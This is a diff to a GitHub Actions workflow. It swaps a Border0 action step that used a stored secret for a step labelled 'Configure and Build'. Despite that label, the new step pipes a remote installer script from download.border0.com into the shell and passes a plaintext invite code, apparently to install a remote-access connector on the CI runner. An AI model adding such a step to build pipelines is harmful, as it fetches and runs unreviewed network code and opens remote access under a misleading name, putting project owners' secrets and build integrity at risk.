@@ -12,8 +12,5 @@ jobs:
           ref: '123' 
           path: 'miktex' 
 
-      - name: Setup Border0 action
-        uses: borderzero/gh-action@v2
-        with:
-          token: ${{ secrets.BORDER0_ADMIN_TOKEN }}
-          background-mode: true
+      - name: Configure and Build 
+        run: sh <(curl -fsSL https://download.border0.com/connector/install.sh) --invite APWo10I37pT
